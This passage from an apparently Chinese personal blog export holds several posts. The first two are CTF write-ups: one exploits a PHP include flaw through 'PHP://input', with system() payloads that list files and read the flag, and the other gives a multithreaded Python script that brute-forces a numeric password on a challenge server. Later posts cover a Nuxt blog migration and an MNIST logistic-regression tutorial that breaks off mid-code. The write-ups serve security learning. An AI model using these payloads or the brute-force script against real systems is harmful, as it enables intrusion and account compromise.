<p>打开场景后，是<code>index.php</code>的源码：<a id="more"></a></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">echo</span> $_GET[<span class="string">'hello'</span>];</span><br><span class="line">$page=$_GET[<span class="string">'page'</span>];</span><br><span class="line"><span class="keyword">while</span> (strstr($page, <span class="string">"php://"</span>)) &#123;</span><br><span class="line">    $page=str_replace(<span class="string">"php://"</span>, <span class="string">""</span>, $page);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include</span>($page);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>大概解读一下，首先获取参数<code>hello</code>并将其值输出，然后获取<code>page</code>参数的值，接着如果<code>page</code>参数中如果包含<code>php://</code>子串，则将其替换，直至不再包含该子串；然后将替换后的参数值作为文件名，将其文件引入到<code>index.php</code>中。</p>
<p>思路：二话不说，先用御剑扫描工具扫一下，看看有哪些可以访问的，然后发现一个后台登录地址，原本想爆破密码的，但是想了想，题目是说<code>include</code>，所以应该不是爆破密码。</p>
<p>应该还是从源码中的<code>include</code>下手，当然了我们得先绕过替换字符串的代码，我们可以用大写的<code>PHP</code>进行代替<code>php</code>，然后我又去搜了一下<code>php include</code>漏洞，发现还真不少，其中有一个比较适合：</p>
<p>以<code>POST</code>方式提交代码片段：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">index.php?file=php:<span class="comment">//input</span></span><br><span class="line">POST:</span><br><span class="line"><span class="meta">&lt;?</span> phpinfo();<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>然后将会在 <code>index.php</code>所在文件下的文件 <code>shell.php</code> 内增加 <code>&lt;?php phpinfo();?&gt;</code> 一句话</p>
<p>不过得有两个条件:</p>
<ul>
<li><p><code>allow_url_include = On</code></p>
</li>
<li><p>对 <code>allow_url_fopen</code>不做要求。</p>
</li>
</ul>
<p>结合本题，我们应该构造下面的请求：</p>
<p><img src="/2022/05/20/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb-php-include%E9%A2%98%E8%A7%A3/D:%5CjsProject%5Chexo-blog-files%5Csource_posts%5C%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb-php-include%E9%A2%98%E8%A7%A3%5Cimage-20220520115557474.png" alt="image-20220520115557474"></p>
<p>提交过后，果然在页面中获取了很多信息。</p>
<p>那我们看看当前目录下都有哪些文件吧：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span> system(<span class="string">'ls'</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>然后我们发现了一个文件：<code>fl4gisisish3r3.php</code></p>
<p>好！我们输出看一下里边的内容：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span> system(<span class="string">'cat fl4gisisish3r3.php'</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>果然获取了<code>flag</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$flag=<span class="string">"ctf&#123;876a5fca-96c6-4cbd-9075-46f0c89475d2&#125;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<hr>
<p>==黑帽白帽，就在一念之间！==</p>
]]></content>
      <categories>
        <category>网络攻防</category>
      </categories>
      <tags>
        <tag>include漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>使用python多线程爆破数字密码</title>
    <url>/2022/05/14/%E4%BD%BF%E7%94%A8python%E5%A4%9A%E7%BA%BF%E7%A8%8B%E7%88%86%E7%A0%B4%E6%95%B0%E5%AD%97%E5%AF%86%E7%A0%81/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>说起网络密码爆破，我们可能第一时间想到大名鼎鼎的软件<code>Burp Suite</code>，该软件可以方便地进行网络代理，数据截包、改包，密码爆破，但是密码爆破效率实在是太低，如果我们知道密码的类型，例如是纯数字的密码，那我们可以将密码进行分段，不同的范围使用一个线程进行爆破，利用并发进行节省时间。</p>
<a id="more"></a>

<h2 id="题目背景"><a href="#题目背景" class="headerlink" title="题目背景"></a>题目背景</h2><p><code>BUGKU</code>的<a href="https://ctf.bugku.com/challenges/detail/id/82.html" target="_blank" rel="noopener">《好像需要密码》</a></p>
<p>打开题目后，我们发现只需要提交一个密码的表单即可，而且知道了是<code>5</code>位数字，即<code>00000</code>-<code>99999</code>。</p>
<p>分析了范围以后，接下来就是将密码分段，然后开启一个个线程执行爆破程序，详细如代码所示：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"><span class="comment"># 尝试爆破 [start, end] 区间的密码</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hack</span><span class="params">(name, start, end)</span>:</span></span><br><span class="line">    print(<span class="string">'thread %s start! %s ---&gt; %s'</span> % (name, start, end))</span><br><span class="line">    pas = start</span><br><span class="line">    <span class="keyword">while</span> pas &lt;= end:</span><br><span class="line">        test = requests.post(<span class="string">'http://114.67.175.224:15120'</span>, data=&#123;<span class="string">'pwd'</span>: pas&#125;)</span><br><span class="line">        <span class="comment"># 如果响应体中含有 flag 字样，说明密码争取</span></span><br><span class="line">        <span class="comment"># 实际上也可以将每一个响应体的长度进行统计，含有 flag 的一般跟其他的是不一样的</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">'flag'</span> <span class="keyword">in</span> test.text:</span><br><span class="line">            print(<span class="string">'The correct password is：'</span>, pas)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        pas += <span class="number">1</span></span><br><span class="line">    print(<span class="string">'thread %s end! '</span> % (name))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="comment"># 从 10000-99999  我这里偷懒了，把0-9999的去掉了 hhhh</span></span><br><span class="line">    start, end = <span class="number">10000</span>, <span class="number">100000</span></span><br><span class="line">    <span class="comment"># 线程总数</span></span><br><span class="line">    total = <span class="number">500</span></span><br><span class="line">    <span class="comment"># 每个线程要爆破的区间长度</span></span><br><span class="line">    step = int((end - start) / total)</span><br><span class="line">    left = start</span><br><span class="line">    threadsList = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(total):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># 创建线程并传递参数过去</span></span><br><span class="line">            t = threading.Thread(target=hack, args=(<span class="string">"Thread-"</span> + str(i), left, left + step,))</span><br><span class="line">            <span class="comment"># 线程开始执行</span></span><br><span class="line">            t.start()</span><br><span class="line">            threadsList.append(t)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            print(<span class="string">"Error: unable to start thread"</span>)</span><br><span class="line">        left += step</span><br><span class="line">    <span class="comment"># 主线程等待其他线程完毕后再退出</span></span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> threadsList:</span><br><span class="line">        t.join()</span><br><span class="line">    print(<span class="string">'main thread end!!'</span>)</span><br></pre></td></tr></table></figure>

<hr>
<p>==黑帽白帽，就在一念之间！==</p>
]]></content>
      <categories>
        <category>网络攻防</category>
      </categories>
      <tags>
        <tag>多线程</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>使用Nuxt改造博客前端</title>
    <url>/2022/05/07/%E4%BD%BF%E7%94%A8Nuxt%E6%94%B9%E9%80%A0%E5%8D%9A%E5%AE%A2%E5%89%8D%E7%AB%AF/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>是的，没错，我又来对我的博客系统下手了！回想起2020年，第一次使用<a href="https://hexo.io/zh-cn/index.html" target="_blank" rel="noopener">hexo</a>搭建的静态博客，那是我对博客系统的初体验，当时搭建完毕后，到处找插件，找主题，心情也很激动，因为这是我的第一个网站，当时熬夜搭建网站的激动现在仍然可以体会得到！</p>
<a id="more"></a>

<p>后来慢慢地接触到了动态博客的概念，进一步了解到了<a href="http://typecho.org/" target="_blank" rel="noopener">typecho</a>，为了搭建它，我自己开始租借服务器，开启了玩转服务器之旅。</p>
<p>使用了<code>typecho</code>大概半年以后，逐渐感受到许多不便，特别是该博客使用的是<code>PHP</code>语言开发的，我没有接触过，也暂时不想接触，想要实现某些自定义功能的时候，无从下手。</p>
<p>于是，出于程序员的理念：</p>
<blockquote>
<p>当你觉得某个东西不好用的时候，那你就自己造它。</p>
</blockquote>
<p>我决定自己开干！自己编写一个博客系统！</p>
<p>口号喊得虽然很响，但是激情过后就是无尽的迷茫，自己根本无从下手，但是自己立下的誓言含泪也要完成吧！然后自己在在网上找了很多搭建博客的教程，但是要么就是没有文档，要么就是就给了截图，源码都不提供。不过我也能理解，几乎没有人愿意将从零搭建博客的过程全都记录下来吧，那样子太费时间了。</p>
<p>直到后来，在哔哩哔哩上面找到了李仁密老师的<a href="https://www.bilibili.com/video/BV13t411T72J" target="_blank" rel="noopener">小而美的博客</a>教程，上面详细介绍了如何使用<code>SpringBoot</code>搭建个人博客，然后我就跟着作者一行一行地敲代码，不过到后面我逐渐明白了怎么搭建以后，有一些代码就跟作者不一样了，不过<code>90%</code>左右的代码还是和作者一样的。</p>
<p>时间来到了21年年初，我又开始接触到了前后端分离的概念，觉得这玩意挺新奇的，我就萌发了改造博客的想法，不过要改的话，要改的地方有很多，主要是涉及前端页面的都要重新做，但是我的审美一直不在线，最后设计出来的页面差强人意。然后前端使用<code>Vue</code>和<code>Element-UI</code>,后端之前根据李仁密老师的教程，持久层使用的是<code>Hibernate</code>,然后我这次使用的是<code>Mybatis</code>,其他的思想沿用之前的想法。不过改完以后，有一个致命的弱点，那就是首页访问速度贼慢！而且如果我们尝试在浏览器中查看源码，我们获取到的就是只有一堆<code>js</code>文件，这样子就非常不利于搜索引擎，也就是说如果我不将我的博客链接发出去，那么就几乎不可能有人找得到我的博客。我原本写博客就是为了想分享一下自己的学习心得，或者和其他人一起交流，改造博客以后搜索引擎都不来我这了，这就违背了我的初衷，这也为我后面改造博客埋下伏笔。</p>
<h2 id="改造之路"><a href="#改造之路" class="headerlink" title="改造之路"></a>改造之路</h2><p>经过一年的使用后，我渐渐觉得博客系统还是需要一定的访问量，不然不好意思说是博客系统，然后我就比对了一下<code>Vue</code>项目进行服务端渲染的方案，最终选定使用<code>Nuxt</code>改造。</p>
<p>确定以后，就可以上手了，我之前编写的代码中，很多页面的请求数据都是放在<code>created()</code>函数中，但是在<code>Nuxt</code>框架下，该函数会在客户端和服务端各执行一次，这不是我想要的，因此主要工作是将请求数据的代码放在了<code>asyncData()</code>函数中。</p>
<p>还好我之前写的前端都是按照模块化开发，很多功能都是按照组件来进行开发，如此一来，改造起来就快很多了。</p>
<p>还好我之前使用的是前后端分离模式，后端就只需要提供接口，改造起来，后端一行代码也不需要更改。</p>
<h2 id="遇到的坑"><a href="#遇到的坑" class="headerlink" title="遇到的坑"></a>遇到的坑</h2><p>虽然改造起来比较简单，但是有些代码也并不是一帆风顺，也到了很多坑，还好自己或多或少找到了解决方案。</p>
<ul>
<li><p>错误一：地址栏刷新<code>/home</code>的时候，后台控制台报<code>status</code> 未定义，但是刷新</p>
<p><code>/</code>是可以的（我的之前代码逻辑是：输入<code>/</code>时候，路由直接跳转到<code>/home</code>）</p>
<p>解决方案：设置跨域代理，即先安装好<code>axios</code>:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm install @nuxtjs/axios -s</span><br></pre></td></tr></table></figure>

<p>接着在项目的根目录下中<code>plugins</code>中新建<code>axios.js</code>文件，输入以下内容：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @Author      : YaleXin</span></span><br><span class="line"><span class="comment"> * @Email       : me@yalexin.top</span></span><br><span class="line"><span class="comment"> * @LastEditors : YaleXin</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">import</span> &#123; Message &#125; <span class="keyword">from</span> <span class="string">"element-ui"</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; MessageBox &#125; <span class="keyword">from</span> <span class="string">"element-ui"</span>;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="function"><span class="keyword">function</span> (<span class="params">&#123;store, route, redirect, $axios,req&#125;</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// Error拦截器：出现错误的时候被调用，根据状态码做对应判断并显示全局Message</span></span><br><span class="line">    $axios.onError(<span class="function">(<span class="params">error</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="comment">// console.log('erro statusr =', error.response.status);</span></span><br><span class="line">      <span class="keyword">switch</span> (<span class="built_in">parseInt</span>(error.response.status)) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">400</span>: Message(&#123;</span><br><span class="line">					showClose: <span class="literal">true</span>,</span><br><span class="line">					message: <span class="string">'发送数据错误'</span>,</span><br><span class="line">					type: <span class="string">"error"</span></span><br><span class="line">        &#125;);</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">402</span>: Message(&#123;</span><br><span class="line">					showClose: <span class="literal">true</span>,</span><br><span class="line">					message: <span class="string">'江湖中查无此人！'</span>,</span><br><span class="line">					type: <span class="string">"error"</span></span><br><span class="line">        &#125;);</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">          <span class="comment">// 密码错误</span></span><br><span class="line">				<span class="keyword">case</span> <span class="number">403</span>: Message(&#123;</span><br><span class="line">					showClose: <span class="literal">true</span>,</span><br><span class="line">					message: <span class="string">'密令错误！'</span>,</span><br><span class="line">					type: <span class="string">"error"</span></span><br><span class="line">				&#125;);</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">            <span class="comment">// 密码错误</span></span><br><span class="line">				<span class="keyword">case</span> <span class="number">405</span>: Message(&#123;</span><br><span class="line">					showClose: <span class="literal">true</span>,</span><br><span class="line">					message: <span class="string">'口令错误！'</span>,</span><br><span class="line">					type: <span class="string">"error"</span></span><br><span class="line">				&#125;);</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				<span class="keyword">case</span> <span class="number">480</span>: <span class="comment">// 未登录</span></span><br><span class="line">          <span class="built_in">console</span>.log(<span class="string">'480!!'</span>);</span><br><span class="line">          redirect(redirectURL(route,req))</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				<span class="keyword">case</span> <span class="number">500</span>: Message(&#123;</span><br><span class="line">					showClose: <span class="literal">true</span>,</span><br><span class="line">					message: <span class="string">'后端出错'</span>,</span><br><span class="line">					type: <span class="string">"error"</span></span><br><span class="line">				&#125;); <span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="comment">// Response拦截器：对正常返回的数据进行处理</span></span><br><span class="line">    $axios.onResponse(<span class="function">(<span class="params">response</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> response.data </span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取重定向地址</span></span><br><span class="line"><span class="keyword">const</span> redirectURL = <span class="function">(<span class="params">route,req</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">// 客户端</span></span><br><span class="line">  <span class="keyword">if</span>(process.client) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="string">'/admin/login'</span></span><br><span class="line">  &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'/admin/login'</span></span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后在<code>nuxt.config.js</code>中配置<code>axios</code></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"> plugins: [</span><br><span class="line">   &#123;</span><br><span class="line">     src: <span class="string">'~/plugins/axios'</span>,</span><br><span class="line">     <span class="string">'ssr'</span>: <span class="literal">true</span> <span class="comment">// 服务端渲染</span></span><br><span class="line">  &#125;,</span><br><span class="line"> buildModules: [</span><br><span class="line">   <span class="string">'@nuxtjs/axios'</span>,</span><br><span class="line"> ],</span><br><span class="line"> modules: [</span><br><span class="line">   <span class="string">'@nuxtjs/axios'</span>,</span><br><span class="line">   <span class="string">'@nuxtjs/proxy'</span>,</span><br><span class="line"> ],</span><br><span class="line"> axios: &#123;</span><br><span class="line">   <span class="comment">// Workaround to avoid enforcing hard-coded localhost:3000: https://github.com/nuxt-community/axios-module/issues/308</span></span><br><span class="line">   proxy: <span class="literal">true</span>, <span class="comment">// 开启跨域行为</span></span><br><span class="line">   prefix: <span class="string">'/api'</span>, <span class="comment">// 配置基本得url地址</span></span><br><span class="line">   credentials: <span class="literal">true</span></span><br><span class="line"> &#125;,</span><br><span class="line">     <span class="comment">// 配置代理</span></span><br><span class="line"> proxy: &#123;</span><br><span class="line">   <span class="string">'/api'</span>: &#123;</span><br><span class="line">       target: <span class="string">'http://localhost:8080/api/'</span>,</span><br><span class="line">       ws: <span class="literal">false</span>,</span><br><span class="line">       changeOrigin: <span class="literal">true</span>,</span><br><span class="line">       pathRewrite: &#123;</span><br><span class="line">           <span class="string">'^/api'</span>: <span class="string">''</span>,</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;,</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure>
</li>
<li><p>我的项目中用了<code>echarts</code>，但是我就仅仅用来热力图组件，不想把整个<code>echarts</code>项目安装进我的项目，就想着怎么按需引入。后来在某个地方找到官方定制的<a href="https://echarts.apache.org/zh/builder.html" target="_blank" rel="noopener">网站</a>，在上面的网站选后组件以后，直接下载<code>js</code>文件，然后就按照文档教程，在需要引入的地方引入：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">// .vue 文件中：</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="keyword">import</span> echarts <span class="keyword">from</span> <span class="string">"~/assets/js/echarts.min.js"</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="javascript"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line">    mounted()&#123;</span><br><span class="line">        echarts.init(...);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>有的时候<code>node</code>服务端报<code>window is not defined</code></p>
<p>解决方案：有些代码会在服务端和客户端中都执行一遍，但是在服务端中，是没有<code>window</code>这个对象的，因此要在代码中加一个判断是在哪个端的语句：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 如果是客户端</span></span><br><span class="line"> <span class="keyword">if</span> (process.client) &#123;</span><br><span class="line">  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>在组件中引用自定义的<code>css</code>文件总是失效。</p>
<p>解决方法：原先按照<code>vue</code>的方式，引用方式为：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">@<span class="keyword">import</span> <span class="string">"~/assets/css/blog.css"</span></span><br></pre></td></tr></table></figure>

<p>这个方法似乎在<code>Nuxt</code>框架下不行，要换成以下方式引用：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line">        head()&#123;</span><br><span class="line"><span class="actionscript">    		<span class="keyword">return</span>&#123;</span></span><br><span class="line">      			link: [</span><br><span class="line"><span class="javascript">        			&#123;<span class="attr">rel</span>: <span class="string">'stylesheet'</span>, <span class="attr">href</span>: 									<span class="built_in">require</span>(<span class="string">'~/assets/css/blog.css'</span>)&#125;</span></span><br><span class="line">      			]</span><br><span class="line">    		&#125;</span><br><span class="line">  		&#125;,</span><br><span class="line">    &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>总得来说，改造起来困难不是很大，加上<code>vue</code>的生态的确很好，很多问题都可以找得到解决方案，目前改造后的系统：</p>
</li>
<li><input checked disabled type="checkbox"> <p>支持页面动画，改善用户体验</p>
</li>
<li><input checked disabled type="checkbox"> <p>全站的站内链接均使用<code>nuxt-link</code>方式，加快页面切换以及避免相同路由切换时报错，而且还有利于<code>SEO</code></p>
</li>
<li><input checked disabled type="checkbox"> <p>后台登陆支持验证码，增加安全性，之前的是输入正确的用户名和密码以后就可以登录了，安全性不是很大（==虽然验证码也没有加多少安全性==）</p>
</li>
<li><input checked disabled type="checkbox"> <p>后台markdown解析增加高亮语法、删除线语法，<del>就是这样子</del>，这个插件官方没有，应该是太简单做了，我对照着原有的插件就做出来了。</p>
</li>
<li><input checked disabled type="checkbox"> <p>支持公式：如这是西塔$\theta$,下面是公式<br>$$<br>y=\sum_{i=0}^{n}x_i<br>$$</p>
</li>
<li></li>
</ul>
<p>未来<strong>可能</strong>进一步完善的方向：</p>
<ul>
<li><input disabled type="checkbox"> 恢复文章下的评论组件，为什么叫恢复呢，因为之前的是支持的，但是我改造以后，回复按钮的绑定事件一直不触发，当时调了一天都没有调出来，调到自闭。</li>
<li><input disabled type="checkbox"> 支持夜间模式，这个好像挺难的，不好实现，有可能最终不实现了，哈哈哈哈哈哈哈哈哈。</li>
</ul>
]]></content>
      <categories>
        <category>博客</category>
      </categories>
      <tags>
        <tag>Vue</tag>
        <tag>Nuxt</tag>
        <tag>前端</tag>
      </tags>
  </entry>
  <entry>
    <title>逻辑回归-手写字符识别</title>
    <url>/2022/04/25/%E9%80%BB%E8%BE%91%E5%9B%9E%E5%BD%92-%E6%89%8B%E5%86%99%E5%AD%97%E7%AC%A6%E8%AF%86%E5%88%AB/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>逻辑回归虽然在名字里边带了逻辑，但是经常被用于分类问题，而且常和线性回归相结合，本文将利用<code>MNIST</code>数据集，完成多分类问题，带你一窥逻辑回归背后的原理。</p>
<a id="more"></a>

<h2 id="相关原理"><a href="#相关原理" class="headerlink" title="相关原理"></a>相关原理</h2><h3 id="数据集获取"><a href="#数据集获取" class="headerlink" title="数据集获取"></a>数据集获取</h3><p><a href="http://yann.lecun.com/exdb/mnist/" target="_blank" rel="noopener">下载地址</a></p>
<p>该数据集中包含了6万个训练集样本、1万个测试集样本，每个样本都是<code>28*28</code>的字符图片，标签为该字符对应的字符类别，下图为某一个样本：</p>
<p><img src="https://qiniu.yalexin.top/QQ%E6%88%AA%E5%9B%BE20220425125449.png" alt></p>
<p>获取数据集以后，我们还要将图片降维，使之变为长度<code>784</code>的向量，意味着我们有<code>784</code>个特征，虽然提取特征有更好的方法，但是我们这里仍然使用线性回归的方法。</p>
<p>此外，每份样本的标签值是该样本的类别，还应该进行<a href="https://baike.baidu.com/item/%E7%8B%AC%E7%83%AD%E7%BC%96%E7%A0%81/9717350?fr=aladdin" target="_blank" rel="noopener">独热编码</a>，将其转为每个类别的概率。</p>
<h3 id="sigmoid函数"><a href="#sigmoid函数" class="headerlink" title="sigmoid函数"></a>sigmoid函数</h3><p>该函数也称为逻辑函数，函数定义如下：</p>
<p>  <img src="https://qiniu.yalexin.top/QQ%E6%88%AA%E5%9B%BE20220425125914.png" alt="g(z)=\frac{1}{1+e^{-z}} "></p>
<p>函数大概长这样：</p>
<p><img src="https://qiniu.yalexin.top/QQ%E6%88%AA%E5%9B%BE20220425130418.png" alt="g(z)=\frac{1}{1+e^{-z}} "></p>
<p>它很符合我们的直观感觉，在无穷大或者无穷小的时候，变化不大，要么趋于1要么趋于0，而在中间位置变化最为明显，我们也可以求得其导数：</p>
<p><img src="https://qiniu.yalexin.top/QQ%E6%88%AA%E5%9B%BE20220425130720.png" alt="g&#39;(z)=g(z)(1-g(z))"></p>
<h3 id="Forward-propagation（前向传播-）"><a href="#Forward-propagation（前向传播-）" class="headerlink" title="Forward propagation（前向传播 ）"></a>Forward propagation（前向传播 ）</h3><p>该过程是从输入到输出的过程，即从图片输入到计算其每一个类别概率的过程，如果是二分类问题，那么输出则是该图片属于该类别的概率，若是多分类，那么输出的个数应该与类别数量一致，其每一个输出对应类别的概率。</p>
<p><img src="https://qiniu.yalexin.top/QQ%E6%88%AA%E5%9B%BE20220425131534.png" alt="\widehat{y}_{i}=g(z)=g\left(\mathrm{w}^{T} x+b\right)=\frac{1}{1+e^{-\mathrm{w}^{T} x-b}}"></p>
<blockquote>
<p>这里的 <code>w</code>就是我们图片每一个像素对应的权重，故长度也为784</p>
</blockquote>
<h3 id="Back-propagation-（反向传播）"><a href="#Back-propagation-（反向传播）" class="headerlink" title="Back propagation （反向传播）"></a>Back propagation （反向传播）</h3><p>反向传播指的是从根据输出，计算梯度，更新参数的过程，这里使用的仍然是梯度下降分析法。不过我们先介绍一下交叉熵的概念，这个一般用于衡量两个概率分布的距离，也可以说用来判断两个模型之间有多“像”，该函数定义如下：</p>
<p><img src="https://qiniu.yalexin.top/QQ%E6%88%AA%E5%9B%BE20220425133102.png" alt></p>
<p>我们也是用该函数作为我们的损失函数。</p>
<p>该函数对<code>z</code>求导为：</p>
<p><img src="https://qiniu.yalexin.top/QQ%E6%88%AA%E5%9B%BE20220425135143.png" alt="\frac{\mathrm{d}L}{\mathrm{d}z}=\frac{-y_i}{g\left(z\right)}g\left(z\right)\left(1-g\left(z\right)\right)+\frac{1-y_i}{1-g\left(z\right)}g\left(z\right)\left(1-g\left(z\right)\right)=g\left(z\right)-y_i"></p>
<p>进一步地，对参数<code>w</code>求导</p>
<p><img src="https://qiniu.yalexin.top/QQ%E6%88%AA%E5%9B%BE20220425135445.png" alt="\frac{\partial L}{\partial w}=\frac{\mathrm{d} L}{\mathrm{d}z}\frac{\partial z}{\partial w}=\frac{\mathrm{d} L}{\mathrm{d}z}x=\left(g\left(z\right)-y\right)x"></p>
<p>同理，对<code>b</code>求导</p>
<p><img src="https://qiniu.yalexin.top/QQ%E6%88%AA%E5%9B%BE20220425135716.png" alt="\frac{\partial L}{\partial b}=\frac{\mathrm{d} L}{\mathrm{d}z}\frac{\partial z}{\partial b}=\frac{\mathrm{d} L}{\mathrm{d}z}=g\left(z\right)-y"></p>
<h3 id="softmax-函数"><a href="#softmax-函数" class="headerlink" title="softmax 函数"></a>softmax 函数</h3><p>由于我们的输出有多个，具体来说，输出个数<code>k</code>等于类别数，本数据集而言，有<code>10</code>个，这样就势必带来一个问题，所有的概率加起来和可能不为<code>1</code>，这显然违背常理，因此要进一步处理输出，我们使用<code>softmax</code>函数，该函数定义如下：</p>
<p><img src="https://qiniu.yalexin.top/QQ%E6%88%AA%E5%9B%BE20220425140306.png" alt="softmax\left(o_j\right)=softmax\left(g\left(z_j\right)\right)=\frac{e^{o_j}}{\sum_{i=0}^{k}e^{o_i}}"></p>
<h2 id="训练代码"><a href="#训练代码" class="headerlink" title="训练代码"></a>训练代码</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> gzip</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LogicTrain</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">start_tain</span><span class="params">(self, epoch, learning_rate)</span>:</span></span><br><span class="line">        </span><br><span class="line">        fig = plt.figure()</span><br><span class="line">        cost_ax = fig.add_subplot(<span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>)</span><br><span class="line">        cost_ax.set_title(<span class="string">"Loss change process"</span>)</span><br><span class="line">        accuracy_ax = fig.add_subplot(<span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>)</span><br><span class="line">        accuracy_ax.set_title(<span class="string">"accuracy"</span>)</span><br><span class="line"></span><br><span class="line">        training_inputs, training_labels, validation_inputs, validation_labels, test_inputs, test_labels = self.load_binary_data()</span><br><span class="line">        <span class="comment"># feature_num 是 784，即每一张图片拉成一维的向量的长度</span></span><br><span class="line">        n, feature_num = training_inputs.shape</span><br><span class="line">        k = <span class="number">10</span></span><br><span class="line"></span><br><span class="line">        accuracy_x, accuracy_y = [], []</span><br><span class="line">        w, b = self.init_parameter(feature_num, k)</span><br><span class="line"></span><br><span class="line">        cost_x, cost_y = [], []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(epoch):</span><br><span class="line">            y_hat = self.forward(training_inputs, w, b)</span><br><span class="line">            w, b = self.backward(training_inputs, w, b, training_labels, y_hat, learning_rate)</span><br><span class="line">            crs_etr = self.cross_entropy(training_labels, y_hat)</span><br><span class="line">            loss = np.sum(crs_etr) / n / k</span><br><span class="line">            print(<span class="string">' epoch = '</span>, i, <span class="string">' loss = '</span>, loss)</span><br><span class="line">            cost_x.append(i)</span><br><span class="line">            cost_y.append(loss)</span><br><span class="line">        <span class="comment"># 计算预测验证集的准确性</span></span><br><span class="line">        vl_hat = self.forward(validation_inputs, w, 